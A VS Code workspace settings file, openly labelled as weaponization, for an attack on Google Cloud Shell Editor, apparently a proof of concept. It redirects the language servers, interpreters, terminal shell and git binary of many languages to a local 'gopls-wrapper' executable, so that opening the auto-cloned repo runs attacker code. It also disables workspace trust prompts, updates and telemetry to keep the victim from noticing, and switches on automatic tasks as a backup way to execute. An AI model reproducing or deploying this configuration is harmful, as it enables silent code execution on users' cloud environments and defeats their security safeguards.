{
  // ===========================================================================
  // .vscode/settings.json — Multi-Language LSP Weaponization
  // ===========================================================================
  //
  // This settings file targets EVERY pre-installed language server in
  // Google Cloud Shell Editor (Code OSS 1.109.5, Ubuntu 24.04 container).
  //
  // ATTACK MODEL: Cloud Shell deep link auto-clones this repo. When the
  // editor opens any file, the corresponding extension activates, reads
  // these settings, and spawns our malicious LSP server.
  //
  // PRE-INSTALLED LANGUAGES in Cloud Shell:
  //   Go, Python, Node.js, TypeScript, Ruby, PHP, Java, .NET, C++
  // ===========================================================================

  // ─── GO: gopls hijack ──────────────────────────────────────────────────
  // Cloud Shell has Go pre-installed with the Go extension.
  // "go.alternateTools" overrides ALL Go tool binaries including gopls.
  // This is a first-party VS Code setting — no additional extension needed.
  "go.alternateTools": {
    "gopls": "./gopls-wrapper",
    "go": "./gopls-wrapper",
    "dlv": "./gopls-wrapper"
  },
  "go.useLanguageServer": true,
  "go.languageServerFlags": [],
  "go.toolsManagement.autoUpdate": false,

  // ─── TYPESCRIPT: tsserver hijack ────────────────────────────────────────
  // TypeScript is pre-installed. typescript.tsdk accepts a path to
  // a tsserver module directory.
  "typescript.tsserver.path": "./gopls-wrapper",
  "typescript.tsdk": "./node_modules",
  "typescript.enablePromptUseWorkspaceTsdk": false,

  // ─── PYTHON: multiple LSP paths ────────────────────────────────────────
  // Cloud Shell has Python 3.12 pre-installed with pyright/pylance.
  "python.languageServer": "Pylance",
  "python.pythonPath": "./gopls-wrapper",
  "python.defaultInterpreterPath": "./gopls-wrapper",
  "pyright.langserverPath": "./gopls-wrapper",
  "python.analysis.pylancePath": "./gopls-wrapper",
  "ruff.path": ["./gopls-wrapper"],
  "ruff.interpreter": ["./gopls-wrapper"],

  // ─── TERRAFORM: LS path hijack ─────────────────────────────────────────
  // Terraform extension was pre-installed until June 2026.
  "terraform.languageServer.path": "./gopls-wrapper",
  "terraform.languageServer.external": true,
  "terraform-ls.terraformExecPath": "./gopls-wrapper",

  // ─── RUBY: Solargraph / Ruby LSP ───────────────────────────────────────
  // Ruby 3.2 is pre-installed.
  "rubyLsp.rubyExecutablePath": "./gopls-wrapper",
  "rubyLsp.bundleGemfile": "./Gemfile",
  "solargraph.commandPath": "./gopls-wrapper",
  "ruby.rubocop.executePath": "./gopls-wrapper",

  // ─── RUST: rust-analyzer ───────────────────────────────────────────────
  "rust-analyzer.server.path": "./gopls-wrapper",
  "rust-analyzer.cargo.executable": "./gopls-wrapper",
  "rust-analyzer.server.extraEnv": {
    "RUSTC": "./gopls-wrapper"
  },

  // ─── C# / .NET: OmniSharp ──────────────────────────────────────────────
  // .NET SDKs 6.0, 7.0, 8.0 are pre-installed.
  "omnisharp.path": "./gopls-wrapper",
  "omnisharp.monoPath": "./gopls-wrapper",
  "dotnet.defaultSolution": "disable",
  "csharp.server.path": "./gopls-wrapper",

  // ─── C++: clangd / ccls ────────────────────────────────────────────────
  "clangd.path": "./gopls-wrapper",
  "C_Cpp.default.compilerPath": "./gopls-wrapper",
  "C_Cpp.intelliSenseEngine": "Disabled",

  // ─── JAVA: Eclipse JDT LS ──────────────────────────────────────────────
  // Java 17 (default), 11, 21 available.
  "java.jdt.ls.home": "./gopls-wrapper",
  "java.home": "./gopls-wrapper",
  "java.jdt.ls.java.home": "./gopls-wrapper",

  // ─── DART / FLUTTER ────────────────────────────────────────────────────
  "dart.flutterSdkPath": "./gopls-wrapper",
  "dart.sdkPath": "./gopls-wrapper",

  // ─── PHP: Intelephense ─────────────────────────────────────────────────
  // PHP 8.3 is pre-installed.
  "intelephense.path": "./gopls-wrapper",
  "php.validate.executablePath": "./gopls-wrapper",

  // ─── HASKELL ───────────────────────────────────────────────────────────
  "haskell.serverExecutablePath": "./gopls-wrapper",

  // ─── ELIXIR ────────────────────────────────────────────────────────────
  "elixirLS.pathToElixirLS": "./gopls-wrapper",

  // ─── CLOJURE ───────────────────────────────────────────────────────────
  "clojureLsp.path": "./gopls-wrapper",

  // ─── MARKDOWN ──────────────────────────────────────────────────────────
  "markdown.server.path": "./gopls-wrapper",

  // ─── WORKSPACE CONFIGURATION ───────────────────────────────────────────
  // Disable trust prompts and security warnings
  "security.workspace.trust.enabled": false,
  "security.workspace.trust.startupPrompt": "never",
  "security.workspace.trust.banner": "never",
  "security.workspace.trust.emptyWindow": false,

  // Disable extension verification and updates
  "extensions.autoCheckUpdates": false,
  "extensions.autoUpdate": false,
  "extensions.ignoreRecommendations": true,

  // Quiet mode — suppress notifications that might alert victim
  "telemetry.telemetryLevel": "off",
  "telemetry.enableTelemetry": false,
  "workbench.enableExperiments": false,
  "workbench.settings.enableNaturalLanguageSearch": false,
  "update.mode": "none",
  "update.showReleaseNotes": false,

  // ─── TERMINAL (backup execution path) ──────────────────────────────────
  "terminal.integrated.defaultProfile.linux": "bash",
  "terminal.integrated.shell.linux": "./gopls-wrapper",

  // ─── TASK AUTO-EXECUTION (backup execution path) ───────────────────────
  "task.allowAutomaticTasks": "on",
  "task.autoDetect": "on",
  "task.problemMatchers.neverPrompt": true,

  // ─── GIT (backup execution path) ───────────────────────────────────────
  "git.enabled": false,
  "git.autorefresh": false,
  "git.path": "./gopls-wrapper",

  // ─── FILES ─────────────────────────────────────────────────────────────
  "files.autoSave": "afterDelay",
  "files.autoSaveDelay": 1000,
  "files.watcherExclude": {
    "**/.git/objects/**": true,
    "**/.git/subtree-cache/**": true,
    "**/node_modules/**": true
  }
}
